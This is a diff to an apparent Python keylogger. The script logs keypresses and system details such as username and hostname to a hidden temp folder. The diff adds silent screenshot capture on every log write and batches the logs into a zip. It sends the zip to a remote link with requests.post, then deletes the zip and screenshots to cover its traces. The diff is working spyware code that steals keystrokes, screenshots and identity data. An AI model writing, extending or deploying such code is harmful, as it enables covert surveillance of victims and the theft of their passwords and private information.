@@ -3,10 +3,12 @@ import requests
 from storage import Storage
 import datetime
 from dotenv import load_dotenv
+import pyautogui
 import zipfile
 import platform
 import getpass
 import socket
+import glob
 import json
 import os
 
@@ -30,12 +32,21 @@ def write_cases(data):
             data = curr_system()
             json.dump(data, file, ensure_ascii=False, indent=4)
 
-    forming = F'{datetime.datetime.now()}: {data}' + '\n'
+    time = datetime.datetime.now()
+    forming = F'{time}: {data}' + '\n'
     with open(os.path.join(path, "logs.txt"), "a+", encoding="UTF-8") as file:
         file.write(forming)
 
-    if len(open(os.path.join(path, "logs.txt"), "r", encoding="UTF-8").readlines()) >= 5:
+        screenshot(time)
+
+    if len(open(os.path.join(path, "logs.txt"), "r", encoding="UTF-8").readlines()) >= 50:
         zipper()
+        os.remove(os.path.join(path, "logs.txt"))
+
+
+def screenshot(time):
+    shot = pyautogui.screenshot()
+    shot.save(os.path.join(r"C:\temp\tmpdatacache\screenshots", str(time).replace(":", "-") + ".jpg"))
 
 
 def press(key):
@@ -68,7 +79,7 @@ def send_logs(doc_path):
     try:
         requests.post(link, files=files, data=data)
     except Exception as _ex:
-        pass
+        print(_ex)
 
 
 def dir_structure():
@@ -113,8 +124,17 @@ def zipper():
 
     arc.close()
     send_logs(doc_path=os.path.join(path, str(getpass.getuser() + ".zip")))
+    deleter(path=path)
+
+
+def deleter(path):
+    # delete zip arc
     os.remove(os.path.join(path, str(getpass.getuser() + ".zip")))
-    os.remove(path + r"\tmpdatacache")
+
+    # cleaning the photo dir
+    photos = glob.glob(pathname=r"C:\temp\tmpdatacache\screenshots\*.jpg", recursive=True)
+    for photo in photos:
+        os.remove(photo)
 
 
 if __name__ == '__main__':
